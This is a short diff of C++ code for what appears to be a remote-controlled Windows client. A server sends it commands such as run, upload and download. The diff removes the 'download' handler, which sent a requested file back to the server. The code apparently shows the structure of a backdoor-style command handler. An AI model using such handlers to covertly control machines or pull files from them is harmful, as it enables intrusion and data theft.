@@ -22,7 +22,6 @@ constexpr char PONG_COMMAND[] = "pong";
 constexpr char RUN_COMMAND[] = "run";
 constexpr char OK_COMMAND[] = "ok";
 constexpr char UPLOAD_COMMAND[] = "upload";
-constexpr char DOWNLOAD_COMMAND[] = "download";
 
 constexpr DWORD SLEEP_TIME = 1 * 1000 * 60 * 60;
 
@@ -193,20 +192,7 @@ void handleMsg(ClientSocket& client, const std::string& msg) {
     } else if (command == UPLOAD_COMMAND) {
         client.recvFile();
         client.sendMsg(OK_COMMAND);
-    } else if (command == DOWNLOAD_COMMAND) {
-        if (args.size() != 1) {
-            throw ClientException::invalidArgs;
-        }
-        try {
-            client.sendFile(args[0]);
-        }
-        catch (WinapiException & e) {
-            if (e.getErrorno() == FILE_NOT_FOUND_ERRORNO) {
-                throw ClientException::invalidArgs;
-            }
-            throw e;
-        }
-    }
+    } 
     else {
         throw ClientException::invalidMsg;
     }
